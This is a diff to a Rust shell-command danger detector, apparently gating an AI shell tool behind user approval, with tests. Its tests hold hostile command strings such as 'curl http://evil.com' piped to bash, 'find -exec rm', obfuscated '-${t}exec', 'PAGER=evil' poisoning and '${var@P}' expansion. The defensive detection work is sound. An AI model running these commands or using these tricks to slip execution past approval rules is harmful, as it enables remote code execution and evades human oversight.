@@ -14,9 +14,14 @@ use super::parser::{
 pub enum DangerLevel {
     /// No dangerous patterns detected.
     None,
-    /// Risky but no direct code execution (redirections, variable expansion, chaining).
-    Low,
-    /// Can directly execute arbitrary code (command substitution, eval, find -exec, etc.).
+    /// Command is dangerous. Detected when:
+    /// - Flags give a false sense of safety (e.g., `find -exec`, `sed /e`, `git --upload-pack`)
+    /// - Shell syntax hides execution from allow rules (e.g., `$(...)`, process substitution)
+    /// - Runtime data controls execution (e.g., pipe to shell, `${var@P}`)
+    /// - Environment poisoning (e.g., `export PAGER=evil`, `PAGER=evil git log`)
+    ///
+    /// Requires user approval, `allowedCommands` cannot override.
+    /// Only trusting the complete shell tool auto allows dangerous commands
     High,
 }
 
@@ -35,13 +40,12 @@ pub struct DetectResult {
 
 #[derive(Deserialize)]
 struct DetectorConfig {
-    dangerous_commands: Vec<String>,
     dangerous_options: HashMap<String, Vec<String>>,
     dangerous_env_vars: Vec<String>,
-    env_builtins: Vec<String>,
     shells: Vec<String>,
     safe_commands: Vec<String>,
     safe_options: HashMap<String, Vec<String>>,
+    safe_except_options: HashMap<String, Vec<String>>,
 }
 
 use std::sync::OnceLock;
@@ -87,8 +91,8 @@ pub fn detect(commands: &[ParsedCommand]) -> DetectResult {
 }
 
 /// Detect patterns that span multiple commands.
-fn detect_chain_patterns(commands: &[ParsedCommand], config: &DetectorConfig, is_readonly: bool) -> DangerLevel {
-    // Pipe to shell: `curl | bash`
+fn detect_chain_patterns(commands: &[ParsedCommand], config: &DetectorConfig, _is_readonly: bool) -> DangerLevel {
+    // Pipe to shell: `curl | bash` — runtime data controls execution
     for (i, cmd) in commands.iter().enumerate() {
         if let Some(ChainOperator::Pipe) = cmd.operator
             && let Some(next) = commands.get(i + 1)
@@ -96,19 +100,6 @@ fn detect_chain_patterns(commands: &[ParsedCommand], config: &DetectorConfig, is
         {
             return DangerLevel::High;
         }
-    }
-
-    // Operators (&&, ||, ;, |) are danger, except readonly-only pipes
-    let has_operators = commands.iter().any(|cmd| cmd.operator.is_some());
-    if has_operators {
-        let only_pipes = commands
-            .iter()
-            .all(|cmd| matches!(cmd.operator, None | Some(ChainOperator::Pipe)));
-        if is_readonly && only_pipes {
-            // Readonly-only pipes are safe
-            return DangerLevel::None;
-        }
-        return DangerLevel::Low;
     }
     DangerLevel::None
 }
@@ -118,7 +109,8 @@ fn detect_chain_patterns(commands: &[ParsedCommand], config: &DetectorConfig, is
 // ============================================================================
 
 fn get_danger_level_with_config(cmd: &ParsedCommand, config: &DetectorConfig) -> DangerLevel {
-    // High: direct code execution
+    // High: false sense of safety — flags that turn seemingly safe commands into code execution,
+    // or execution controlled by runtime data
     if cmd.has_command_substitution
         || cmd.has_process_substitution
         || has_dangerous_command_options(cmd, config)
@@ -128,19 +120,10 @@ fn get_danger_level_with_config(cmd: &ParsedCommand, config: &DetectorConfig) ->
         return DangerLevel::High;
     }
 
-    // Low: risky but no direct execution
-    if cmd.has_redirection || cmd.has_variable_expansion || cmd.has_variable_assignment || cmd.has_ansi_c_string {
-        return DangerLevel::Low;
-    }
-
     DangerLevel::None
 }
 
 fn has_dangerous_command_options(cmd: &ParsedCommand, config: &DetectorConfig) -> bool {
-    if config.dangerous_commands.contains(&cmd.command_name) {
-        return true;
-    }
-
     if let Some(options) = config.dangerous_options.get(&cmd.command_name) {
         for opt in options {
             if cmd.args.iter().any(|a| a.contains(opt)) || cmd.command.contains(opt) {
@@ -157,26 +140,12 @@ fn has_dangerous_command_options(cmd: &ParsedCommand, config: &DetectorConfig) -
 }
 
 fn is_dangerous_env_manipulation(cmd: &ParsedCommand, config: &DetectorConfig) -> bool {
-    if !cmd.has_variable_assignment || !config.env_builtins.contains(&cmd.command_name) {
-        return false;
-    }
-
-    for arg in &cmd.args {
-        if arg.starts_with('-') {
-            continue;
-        }
-        let var_name = arg.split('=').next().unwrap_or(arg);
-        if config
+    cmd.variable_assignments.iter().any(|var_name| {
+        config
             .dangerous_env_vars
             .iter()
             .any(|v| v.eq_ignore_ascii_case(var_name))
-        {
-            return true;
-        }
-        break;
-    }
-
-    false
+    })
 }
 
 /// Detect dangerous prompt expansion like `${var@P}` that can execute code.
@@ -189,12 +158,24 @@ fn has_prompt_expansion(cmd: &ParsedCommand) -> bool {
 // ============================================================================
 
 fn is_readonly_with_config(cmd: &ParsedCommand, config: &DetectorConfig) -> bool {
+    // Shell features that produce side effects → not readonly
+    if cmd.has_redirection {
+        return false;
+    }
+
     let cmd_name = cmd.command_name.as_str();
 
+    // 1. Readonly except with specific unsafe flags (find -delete, grep -P, etc.)
+    if let Some(except_opts) = config.safe_except_options.get(cmd_name) {
+        return !cmd.args.iter().any(|a| except_opts.iter().any(|opt| a.contains(opt)));
+    }
+
+    // 2. Readonly only with specific subcommands (git status, cargo metadata, etc.)
     if let Some(safe_opts) = config.safe_options.get(cmd_name) {
         return cmd.args.first().is_some_and(|sub| safe_opts.iter().any(|s| s == sub));
     }
 
+    // 3. Always readonly (ls, cat, pwd, etc.)
     config.safe_commands.iter().any(|s| s == cmd_name)
 }
 
@@ -218,12 +199,18 @@ mod tests {
         }
     }
 
-    fn make_cmd_with_flags(command: &str, redir: bool, subst: bool, var_exp: bool, var_assign: bool) -> ParsedCommand {
+    fn make_cmd_with_flags(
+        command: &str,
+        redir: bool,
+        subst: bool,
+        var_exp: bool,
+        var_assigns: &[&str],
+    ) -> ParsedCommand {
         let mut cmd = make_cmd(command);
         cmd.has_redirection = redir;
         cmd.has_command_substitution = subst;
         cmd.has_variable_expansion = var_exp;
-        cmd.has_variable_assignment = var_assign;
+        cmd.variable_assignments = var_assigns.iter().map(|s| s.to_string()).collect();
         cmd
     }
 
@@ -238,102 +225,128 @@ mod tests {
     }
 
     #[test]
-    fn test_safe_command() {
-        assert_eq!(get_danger_level(&make_cmd("ls -la")), DangerLevel::None);
-    }
-
-    #[test]
-    fn test_redirection_low() {
+    fn test_dangerous() {
+        // --- Command substitution — hides execution from allow rules ---
         assert_eq!(
-            get_danger_level(&make_cmd_with_flags("echo hello", true, false, false, false)),
-            DangerLevel::Low
-        );
-    }
-
-    #[test]
-    fn test_command_substitution_high() {
-        assert_eq!(
-            get_danger_level(&make_cmd_with_flags("echo result", false, true, false, false)),
+            get_danger_level(&make_cmd_with_flags("echo result", false, true, false, &[])),
             DangerLevel::High
         );
-    }
+        assert_eq!(get_danger_level(&make_cmd("echo result")), DangerLevel::None);
 
-    #[test]
-    fn test_variable_expansion_low() {
-        assert_eq!(
-            get_danger_level(&make_cmd_with_flags("echo value", false, false, true, false)),
-            DangerLevel::Low
-        );
-    }
+        // --- Process substitution ---
+        let mut cmd = make_cmd("diff file1");
+        cmd.has_process_substitution = true;
+        assert_eq!(get_danger_level(&cmd), DangerLevel::High);
+        assert_eq!(get_danger_level(&make_cmd("diff file1")), DangerLevel::None);
 
-    #[test]
-    fn test_variable_assignment_low() {
-        assert_eq!(
-            get_danger_level(&make_cmd_with_flags("cmd", false, false, false, true)),
-            DangerLevel::Low
-        );
-    }
-
-    #[test]
-    fn test_dangerous_commands_high() {
-        assert_eq!(get_danger_level(&make_cmd("eval 'code'")), DangerLevel::High);
-        assert_eq!(get_danger_level(&make_cmd("xargs rm")), DangerLevel::High);
+        // --- Dangerous options — false sense of safety ---
         assert_eq!(get_danger_level(&make_cmd("find . -exec rm {} \\;")), DangerLevel::High);
+        assert_eq!(
+            get_danger_level(&make_cmd("find . -name *.rs -type f")),
+            DangerLevel::None
+        );
 
-        // Variable injection can hide dangerous options (e.g., -${t}exec -> -exec)
+        // --- Variable expansion hiding dangerous options ---
         let mut cmd = make_cmd("find . -${t}exec rm {} +");
         cmd.has_variable_expansion = true;
         assert_eq!(get_danger_level(&cmd), DangerLevel::High);
+        assert_eq!(
+            get_danger_level(&make_cmd_with_flags("echo $DIR", false, false, true, &[])),
+            DangerLevel::None
+        );
 
-        // Prompt expansion ${var@P} can execute code
+        // --- Prompt expansion — runtime code execution ---
         let mut cmd = make_cmd("echo ${var@P}");
         cmd.has_variable_expansion = true;
         assert_eq!(get_danger_level(&cmd), DangerLevel::High);
-    }
-
-    #[test]
-    fn test_shell_c_high() {
-        assert_eq!(get_danger_level(&make_cmd("bash -c 'cmd'")), DangerLevel::High);
-    }
-
-    #[test]
-    fn test_dangerous_env_export_pager_high() {
         assert_eq!(
-            get_danger_level(&make_cmd_with_flags("export PAGER=evil", false, false, false, true)),
+            get_danger_level(&make_cmd_with_flags("echo ${var}", false, false, true, &[])),
+            DangerLevel::None
+        );
+
+        // --- Dangerous env vars — export ---
+        assert_eq!(
+            get_danger_level(&make_cmd_with_flags("export PAGER=evil", false, false, false, &[
+                "PAGER"
+            ])),
             DangerLevel::High
         );
-    }
-
-    #[test]
-    fn test_safe_env_export_low() {
         assert_eq!(
-            get_danger_level(&make_cmd_with_flags("export MY_VAR=value", false, false, false, true)),
-            DangerLevel::Low
+            get_danger_level(&make_cmd_with_flags("export MY_VAR=value", false, false, false, &[
+                "MY_VAR"
+            ])),
+            DangerLevel::None
         );
+
+        // --- Dangerous env vars — inline ---
+        let mut cmd = make_cmd("PAGER=evil git log");
+        cmd.variable_assignments = vec!["PAGER".to_string()];
+        assert_eq!(get_danger_level(&cmd), DangerLevel::High);
+        let mut cmd = make_cmd("LANG=C sort file");
+        cmd.variable_assignments = vec!["LANG".to_string()];
+        assert_eq!(get_danger_level(&cmd), DangerLevel::None);
     }
 
     #[test]
-    fn test_readonly_always_safe() {
+    fn test_readonly() {
+        // Always safe (safe_commands)
         assert!(is_readonly_command(&make_cmd("ls -la")));
-        assert!(is_readonly_command(&make_cmd("cat file")));
-        assert!(is_readonly_command(&make_cmd("pwd")));
-    }
 
-    #[test]
-    fn test_readonly_not_safe() {
+        // Not in any safe list
         assert!(!is_readonly_command(&make_cmd("rm file")));
-        assert!(!is_readonly_command(&make_cmd("mv a b")));
-    }
 
-    #[test]
-    fn test_readonly_safe_subcommands() {
+        // Safe subcommands (safe_options)
         assert!(is_readonly_command(&make_cmd("git status")));
-        assert!(is_readonly_command(&make_cmd("cargo metadata")));
+        assert!(!is_readonly_command(&make_cmd("git push")));
+
+        // Safe except specific flags (safe_except_options)
+        assert!(is_readonly_command(&make_cmd("grep pattern file")));
+        assert!(!is_readonly_command(&make_cmd("grep -P pattern file")));
+
+        // Redirection makes command not readonly
+        let mut cmd = make_cmd("echo hello");
+        cmd.has_redirection = true;
+        assert!(!is_readonly_command(&cmd));
+
+        // Safe variable assignment doesn't block readonly
+        let mut cmd = make_cmd("ls");
+        cmd.command = "LANG=C ls".to_string();
+        cmd.variable_assignments = vec!["LANG".to_string()];
+        assert!(is_readonly_command(&cmd));
     }
 
     #[test]
-    fn test_readonly_unsafe_subcommands() {
-        assert!(!is_readonly_command(&make_cmd("git push")));
-        assert!(!is_readonly_command(&make_cmd("cargo build")));
+    fn test_chain_danger() {
+        // Pipe to shell — runtime data controls execution
+        let commands = vec![
+            ParsedCommand {
+                command: "curl http://evil.com".to_string(),
+                command_name: "curl".to_string(),
+                operator: Some(ChainOperator::Pipe),
+                ..Default::default()
+            },
+            ParsedCommand {
+                command: "bash".to_string(),
+                command_name: "bash".to_string(),
+                ..Default::default()
+            },
+        ];
+        assert_eq!(detect(&commands).danger_level, DangerLevel::High);
+
+        // Pipe to non-shell — not dangerous
+        let commands = vec![
+            ParsedCommand {
+                command: "cat file".to_string(),
+                command_name: "cat".to_string(),
+                operator: Some(ChainOperator::Pipe),
+                ..Default::default()
+            },
+            ParsedCommand {
+                command: "grep pattern".to_string(),
+                command_name: "grep".to_string(),
+                ..Default::default()
+            },
+        ];
+        assert_eq!(detect(&commands).danger_level, DangerLevel::None);
     }
 }
